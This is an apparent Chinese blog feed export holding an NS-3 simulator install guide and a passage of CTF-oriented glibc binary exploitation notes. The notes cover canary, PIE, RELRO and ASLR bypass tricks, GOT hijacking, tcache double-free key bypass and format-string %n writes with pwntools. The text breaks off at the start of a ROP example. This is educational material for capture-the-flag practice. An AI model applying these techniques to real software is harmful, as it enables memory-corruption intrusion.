e1e54a85fb254d9e35ca3e098143a3d0902e581dce4e955f34037ff6920bcf87cb1c6b37269a14cefee58d3a750f619778087b70602251343fca563842722df731c2354874e55a41fc6331790b90868a775db8633612d379168a313ef30ab8db5aae73d7b988470a61373931bfd29716d68646192d56ae16291a5d050dca0aa3a0917cdab0587886671818ad6722fad049ff46a454594d7dccb4b485543b9aeaf16c2d168159a44eb5d6d5ad3486785bf16a8ab4c145d52e64c1c6a6cfb6d650576cb40f1a5218cb916b504cf0f7c3ae57791b5ba3a6eb03a3d35e85ff559bc1375732dbf72d10b6007dfbc7d1d3f1b907e74ac6d4db97e08592dd03179c04624007068cd72c582cc109f3e80113d82f05519bd081d22e2bfbec02abec60f848bec9da60b705706b89fe20f81271218d2e0cc4ac733f88341b6f519e57fe37c0ba2b83e97127863845b744496e548ab6cf7c3633600d64013d9c901d9db58c2c4eb7b947f6dbccb3cb1ec22282235471cc1dd719d5fdc2831d09c62acfa1c7c6fa6c3a191ac635917718225dfe65e55d1416c786afa5934311aca64f300dc8d2c35b84c7de7d3fd0268a4063297f15f30e6df75b739630caedf1df9dbcce2b2c3993c2e9a647a0828d3b1f7503dfde5119bca7266d0cdcb2abf67ae593a8a3c36bd576bf2bf0314feb876a462d8ba121faf3b774a5f510e2eeb97c0f2d41896fc8b8d1582224431797636b8bddae4fe58e48ac05e7dcdea92b5d9a998216e99818d227bdcabe2232851abbe91d69d8a03da868022892226e1a3ab2a53b45f636bf9e29b4d907bebe05b30926d142dddc96573a4f5e7614325f97ec37cc0e670f03152a2cf64b659f78d53dbed59ae5efae90b7e07bb1c2d1a7653e582be99224803a90a2ab3b5e17d2ce66f7d48e8e94e3b052212d6419659e9c74bb01f5c0fe562c7d32629134aee4a0093ec38e0419b7269ab22c86bdf2a450c2f12fa16542141b7fcd4169381e169ec269852ce8fa832f4cbd2afc373b811bf536ec1db688e13a213d5670b44da59c8ba2d2ff7ff4809b6deda8f99e56eb1c32e98e41a48152fcbfa19fc3e7927c07c117a1b88d54763260cad4f01997249724981a7fd6cba56cdd1cb513c350731ce7c46956ef0ae7e710cebbadd40d49cd680b1e55f0ffa48104bd6e69496ea74427d5c24f8edc99564489b30e545d56a468fcff721c597948a0b7ad4fe75563f4595df4106169a7c7c07a7b759565c4de889869d129b672051bfedefa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Who am I?(拼音小写哦)</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>求职</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NS3安装</title>
    <link href="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>我这里用的是vmware+ubuntu22</p><p>还是建议新创一个虚拟机，简单省事，磁盘划多一点，我划了40g</p><h2 id="配置NS3环境">配置NS3环境</h2><h3 id="安装NS3依赖库">安装NS3依赖库</h3><p>更新apt</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get update<br></code></pre></td></tr></table></figure><p>（1）安装Python API 用户的最低要求（3.30 版及更高版本，以及 ns-3-dev）：这是从已发布的压缩包中使用 Python 绑定所需的最小包集。C++用户的最低要求（3.36 版和开发）：对于 ns-3-dev 和 ns-3.36（及更高版本）版本，还需要 CMake。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install g++ python3 python3-dev pkg-config sqlite3 cmake<br></code></pre></td></tr></table></figure><p>（2）安装NS3代码维护使用的源码版本控制管理系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install mercurial<br></code></pre></td></tr></table></figure><p>（3）Netanim动画师需要qt5开发工具，对于 Ubuntu 20.10 及更早版本，单个 “qt5-default” 包就足够了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install qt5-default<br></code></pre></td></tr></table></figure><p>对于更高版本ubuntu，可运行如下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools<br>apt-get install qtcreator<br>apt-get install qt5*<br></code></pre></td></tr></table></figure><p>（4）运行python绑定ns-3-dev需要bazaar这个组件。（支持bake构建工具）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install autoconf cvs bzr unrar<br></code></pre></td></tr></table></figure><p>（5）安装调试工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gdb valgrind<br></code></pre></td></tr></table></figure><p>（6）支持更多精确WIFI模块的GNU Scientific Library (GSL)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gsl-bin libgsl-dev libgslcblas0<br></code></pre></td></tr></table></figure><p>（7）仿真必需的词法分析器和语法分析生成器，必装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install flex bison libfl-dev<br></code></pre></td></tr></table></figure><p>（8）一些Network Simulation Cradle (nsc) stacks需要gcc-3.4</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install g++-3.4 gcc-3.4<br></code></pre></td></tr></table></figure><p>（9）读取pcap的packet traces，即包嗅探器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install tcpdump<br></code></pre></td></tr></table></figure><p>（10）支持统计特性的数据库软件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install sqlite sqlite3 libsqlite3-devsudo apt-get install g++-3.4 gcc-3.4<br></code></pre></td></tr></table></figure><p>（11）xml的配置存储软件(requires libxml2 &gt;= version 2.7)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libxml2 libxml2-dev<br></code></pre></td></tr></table></figure><p>（12）基于GTK的配置系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libgtk2.0-0 libgtk2.0-dev<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libgtk-3-dev<br></code></pre></td></tr></table></figure><p>（13）在虚拟机and ns-3上测试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install vtun lxc uml-utilities<br></code></pre></td></tr></table></figure><p>（14）支持utils/check-style.py 代码风格检查程序</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install uncrustify<br></code></pre></td></tr></table></figure><p>（15）文档生成器，从源代码中生成说明文档</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install doxygen graphviz imagemagick<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install texlive texlive-extra-utils texlive-latex-extra texlive-font-utils dvipng latexmk<br></code></pre></td></tr></table></figure><p>（16）ns-3手册和教程是用reStructuredText for Sphinx编写的（doc/tutorial、doc/manual、doc/models），并且图形通常以dia为单位：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install python3-sphinx dia <br></code></pre></td></tr></table></figure><p>（17）Gustavo’s ns-3-pyviz的可视化软件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gir1.2-goocanvas-2.0 python3-gi python3-gi-cairo python3-pygraphviz gir1.2-gtk-3.0 ipython3<br></code></pre></td></tr></table></figure><p>（18）支持openflow 模块(需要一些boost库)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libxml2 libxml2-dev libboost-all-dev<br></code></pre></td></tr></table></figure><p>（19）支持基于 MPI的分布式仿真</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install openmpi-bin openmpi-common openmpi-doc libopenmpi-dev<br></code></pre></td></tr></table></figure><h3 id="安装ns3的基础模块">安装ns3的基础模块</h3><p>现在最新3.40版本，选择下载3.40版本</p><p><a href="https://www.nsnam.org/releases/ns-3-40/">ns-3.40 | ns-3 (nsnam.org)</a></p><p>下载下来放到虚拟机里解压</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -jxvf ns-allinone-3.40.tar.bz2<br></code></pre></td></tr></table></figure><p>cd 至ns-allinone-3.40/ns-3.40</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./ns3 configure --enable-examples --enable-tests  <span class="hljs-comment"># 配置文件</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/2.png" alt="2"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./ns3 build  <span class="hljs-comment"># 编译ns3</span><br></code></pre></td></tr></table></figure><p>编译有点慢，我编译到90%卡住了</p><p>重启了下，完成剩下的10%</p><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/3.png" alt="3"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./test.py  <span class="hljs-comment"># 测试</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/4.png" alt="4"></p><p>ok没问题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">./ns3 run first  <span class="hljs-comment"># 运行第一个脚本</span><br>./ns3 run <span class="hljs-string">&#x27;first --PrintHelp&#x27;</span><br><span class="hljs-comment"># 进入超级用户之后无法运行脚本（Refuse to run as root）</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/5.png" alt="5"></p><h3 id="NetAnim安装与启动">NetAnim安装与启动</h3><p>cd进入到ns-allinone-3.40/netanim-3.109</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo qmake NetAnim.pro  <span class="hljs-comment"># NetAnim的编译安装</span><br>sudo make<br></code></pre></td></tr></table></figure><p>这里显示没有qmake这个命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt更新了也还是没有可用的软件包 qt5-default，但是它被其它的软件包引用了。<br>这可能意味着这个缺失的软件包可能已被废弃，<br>或者只能在其他发布源中找到<br></code></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools<br>apt-get install qtcreator<br>apt-get install qt5*<br></code></pre></td></tr></table></figure><p>ok继续重新执行前两步</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo qmake NetAnim.pro  <span class="hljs-comment"># NetAnim的编译安装</span><br>sudo make<br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/6.png" alt="6"></p><p>成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo ./NetAnim<br></code></pre></td></tr></table></figure><p>启动看看</p><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/7.png" alt="7"></p><blockquote><p>感觉还是划少了，只有14个g可用了，磁盘扩充有点麻烦</p></blockquote><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/FA49WDR@N9Q3ITL4UXD%5D%5BL.png" alt="img"></p><h2 id="开发环境配置">开发环境配置</h2><p>我选VScode</p><p>去官网下载好deb，放入ubuntu，dpkg命令安装好</p><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/9.png" alt="9"></p><h3 id="安装插件">安装插件</h3><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/10.png" alt="10"></p><h3 id="配置环境">配置环境</h3><p>在ns3目录里启动vscode</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nq@nq-virtual-machine:~/桌面/ns-allinone-3.40$ code .<br></code></pre></td></tr></table></figure><p>按F1（Ctrl+Shift+P）调出命令面板，配置相关设置“c/c++: Edit configurations(json)</p><p>还有点问题，未完待续</p><h2 id="参考">参考</h2><p><a href="https://blog.csdn.net/qq_53273581/article/details/124848777">Ubuntu20.04安装NS3的3.36版本（最新版本）_ns3安装eclipse csdn-CSDN博客</a></p><p><a href="https://blog.csdn.net/Graduate2015/article/details/129301363">【ns-3】VS Code开发环境配置_如何用vscode打开ns3-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>NS3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc pwn总结</title>
    <link href="/2024/01/26/pwn%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/26/pwn%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><blockquote><p>linux平台下glibc pwn 一般都是给个linux二进制文件，题目预先设计好了某个漏洞，然后你能利用漏洞，达成任意地址读/写，控制程序流，达成getshell或orw读flag什么的</p><p>一般做题步骤：</p><p>1.一般拿到程序先checksec看下保护，然后运行下程序，看看功能，简单做些交互</p><p>2.然后用ida分析那个二进制程序的伪代码，读懂程序，找漏洞</p><p>3.思考利用方法，配合GDB调试，编写出exp</p></blockquote><h3 id="Defense">Defense</h3><h4 id="Canary">Canary</h4><p>canary是一种用来防护栈溢出的保护机制。原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p><p>若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序</p><h5 id="trick：">trick：</h5><ul><li>因为canary末尾是/x00，本身可以被截断，可以栈溢出修改掉末尾的/x00，配合输出函数，泄露canary</li><li>某些用fork函数的题，父子进程的canary是一样的，逐位爆破canary</li><li>Stack Smashing Protect Leak</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminatedn&quot;</span>,<br>                   msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>got表劫持__stack_chk_fail</li></ul><h4 id="PIE">PIE</h4><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址</p><h5 id="trick：-2">trick：</h5><ul><li>partial write：partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</li></ul><h4 id="NX">NX</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>即使某些内存区域不可执行，并使可执行区域不可写</p><p>例：使数据，堆栈和堆段不可执行，而代码段不可写</p><h5 id="trick：-3">trick：</h5><ul><li>一般就是在栈这块地址没法直接执行shellcode，用ROP执行特定的代码段的代码，以达到控制执行流，getshell等目的</li></ul><h4 id="RELRO">RELRO</h4><p>RELRO(RELocation Read-Only, 重定位只读), 此技术主要针对 GOT 改写的攻击方式。分为部分 <strong>RELRO(Partial RELRO)</strong> 与完全 <strong>RELRO(Full RELRO)</strong> 两种</p><ul><li><strong>部分 RELRO</strong>: 在程序装入后，将其中一段 (如<code>.dynamic</code>) 标记为只读，防止程序的一些重定位信息被修改</li><li><strong>完全 RELRO</strong>: 在部分 RELRO 的基础上，在 程序装入时，直接解析完所有符号并填入对应的值，此时所有的 GOT 表项都已初始化，且不装入 <code>link_map</code> 与<code>_dl_runtime_resolve</code> 的地址 (二者都是程 序动态装载的重要结构和函数)。</li></ul><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。RELRO 为” Partial RELRO”, 说明我们对 GOT 表具有写权限。</p><ul><li>当RELRO保护为NO RELRO的时候，init.array、fini.array、got.plt均可读可写；</li><li>为PARTIAL RELRO的时候，ini.array、fini.array可读不可写，got.plt可读可写；</li><li>为FULL RELRO时，init.array、fini.array、got.plt均可读不可写。</li><li>程序在加载的时候，会依次调用init.array数组中的每一个函数指针，在结束的时候，依次调用fini.array中的每一个函数指针当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写fini.array中的函数指针为main函数地址，可以再执行一次main函数。一般来说，这个数组的长度为1，也就是说只能写一个地址。</li></ul><h5 id="trick：-4">trick：</h5><p><strong>GOT Hijacking：</strong></p><p>NO RELRO与PARTIAL RELRO时采用Lazy Binding（延迟绑定）机制时：</p><p>因为不一定每个库函数都会被执行到，所以采用lazy binding的机制，当第一次执行到库函数的某个功能时才会去寻找真正的地址并进行绑定</p><p>Global Offset Table：（GOT）</p><blockquote><p>got在.data段</p><p>plt在.code段的地方</p></blockquote><p>方法：利用程序中某个漏洞，做到例如任意地址写，我们就可以把那个got中的那个地址写成我们要去的地址</p><p>在call 原本那个函数时，就会调我们想去的地址。</p><h4 id="ALSR">ALSR</h4><p>ASLR (Address Space Layout Randomization), 地址空间配置随机加载，简称地址随机化</p><p>heap段，libc段，stack段等开启ALSR之后地址都是不固定的</p><p>值得<strong>注意的是ALSR是系统级的，而PIE是程序级的，一般是系统默认开启ASLR的</strong></p><h5 id="trick：-5">trick：</h5><ul><li><strong>泄露程序地址来绕过ALSR</strong>: 目前广泛应用在操作系统的地址随机化多为粗粒度的实现方式，同一模块中的所有代码与数据的相对偏移固定。只需要通过信息泄露漏洞将某个模块中的任一代码指针或者数据指针泄露，即可通过计算得到此模块中任意代码或数据的地址</li></ul><h4 id="FORTIFY">FORTIFY</h4><p>这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。简单地说，加了这个保护之后（编译时加上参数-D_FORTIFY_SOURCE=2）一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk,  __printf_chk等。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在</p><h3 id="Types-of-vulnerabilities">Types of vulnerabilities</h3><h4 id="Stack-Overflow">Stack Overflow</h4><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。</p><h4 id="Heap-Overflow">Heap Overflow</h4><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数，因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>我们在熟悉堆机制的情况下，运用你高超的堆风水技巧，伪造堆结构体，伪造I/O File结构体等，达成任意地址读写，或者更严格点，在特定位置写入特定值，就可以控制程序getshell等</p><h5 id="off-by-one-off-by-null">off by one/off by null</h5><p>off by one 通常指的是对于堆块的读写存在一个字节的溢出</p><p>off by null则是off by one的一种特殊形式，即仅溢出一个<code>'\0'</code>字节，通常出现于读入字符串时设计逻辑失误的情况（例如使用了 strcpy 或者是手动在末尾加 \0 等）</p><p>其实这两个差不多，只能溢出一个字节我们怎么利用呢？</p><p>一般可以溢出到一个chunk物理相邻高地址 chunk 的 size 域，篡改其 size 域以便后续的利用（例如可以利用造成堆重叠，unlink之类的）</p><h4 id="Use-After-Free">Use After Free</h4><p>字面意思，即当一个内存块被释放之后再次被使用</p><h5 id="发生UAF的情况：">发生UAF的情况：</h5><ul><li>内存块被释放后，其对应的指针没有设置为 NULL</li></ul><h5 id="double-free">double free</h5><ul><li>在glibc2.27之前，主要是fastbin double free：<br>fastbin在free时只会检查现在释放的chunk，是不是开头的chunk，因此可以通过free(C1), free(C2), free(C1)的手法绕过<br>并在在fastbin取出时，会检查size字段是不是属于这个fastbin，因此往往需要伪造一个size</li><li>glibc2.27~glibc2.28，主要是tcache double free<br>相较于fastbin double free，tcache完全没有任何检查，只需要free(C1), free(C1)就可以构造一个环出来</li></ul><blockquote><p><s>这里可能存疑，我怎么记得我做省赛的题glibc2.27里面tcache double free要修改key才能绕过</s></p><p>实际是2.27有的版本没检测，有的版本有tcache doublefree检测</p></blockquote><ul><li>glibc2.29～glibc2.3X，tcache加入了检查机制</li></ul><h6 id="检测：">检测：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span><br><span class="hljs-comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//剪枝</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>两种方法绕过</p><ol><li>想办法修改key字段，能编辑free后的堆改掉key就能绕过</li><li>使用fastbin double free</li></ol><h4 id="Format-String">Format String</h4><p>格式化字符串漏洞的成因在于像printf/sprintf/snprintf等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞。</p><p><strong>格式化字符串漏洞最终可以做到任意地址读/写</strong></p><p>我们一般会分两大步实现漏洞利用：</p><ul><li>第一步构造一个payload来寻找输入字符串到栈顶指针的偏移；</li><li>第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写。</li></ul><p><strong>常用基本的格式化字符串参数介绍：</strong></p><ul><li><p>%c：输出字符，配上%n 可用于向指定地址写数据。</p></li><li><p>%d：输出十进制整数，配上%n 可用于向指定地址写数据。</p></li><li><p>%x：输出 16 进制数据，如%i$x 表示要泄漏偏移 i 处 4 字节长的 16 进制数 据，</p></li><li><p>%i$lx 表示要泄漏偏移 i 处 8 字节长的 16 进制数据，32bit 和 64bit 环境下一 样。</p></li><li><p>%p：输出 16 进制数据，与%x 基本一样，只是附加了前缀 0x，在 32bit 下输 出 4 字节，在 64bit 下输出 8 字节，可通过输出字节的长度来判断目标环境是 32bit 还是 64bit。</p></li><li><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s 表示 输出偏移 i 处地址所指向的字符串，在 32bit 和 64bit 环境下一样，可用于读取 GOT 表等信息。</p></li><li><p>%n：将%n 之前 printf 已经打印的字符个数赋值给偏移处指针所指向的地址 位置，如%100×10$n 表示将 0x64 写入偏移 10 处保存的指针所指向的地址（4 字节），而%$hn 表示写入的地址空间为 2 字节，%$hhn 表示写入的地址空间为 1 字节，%$lln 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时， 直接写 4 字节会导致程序崩溃或等候时间过长，可以通过%$hn 或%$hhn 来适时 调整。</p></li><li><p>%n 是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符 串参数可用于读取信息或配合%n 写数据。</p></li></ul><p>32位/64位下略有差异</p><p>pwntools里fmtstr模块能很方便的使用</p><blockquote><p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。</p><p>fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)</p><p>第一个参数表示格式化字符串的偏移；</p><p>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322</p><p>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</p><p>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。 fmtstr_payload函数返回的就是payload</p><p>实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})</p></blockquote><p>自己手写起来还是挺麻烦的，需要把要写的值拆成两部分，分两次写(先写小的值，后写大的值)，还要防止截断（那些输入函数一般都有/x00截断）</p><h4 id="Integer-Overflow">Integer Overflow</h4><h4 id="Type-Confusion">Type Confusion</h4><h4 id="Race-Condition">Race Condition</h4><h4 id="OOB">OOB</h4><p>(Out-of-Bounds)数组越界</p><h3 id="Stack-Exploitation">Stack Exploitation</h3><h4 id="ROP">ROP</h4><p>即返回导向编程（Return Qriented Proramming）</p><p>通过不断去执行包含ret的程序片段来达到想要的操作</p><p>这些包含ret的程式片段又被称作gadget</p><p>例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4004fa:48 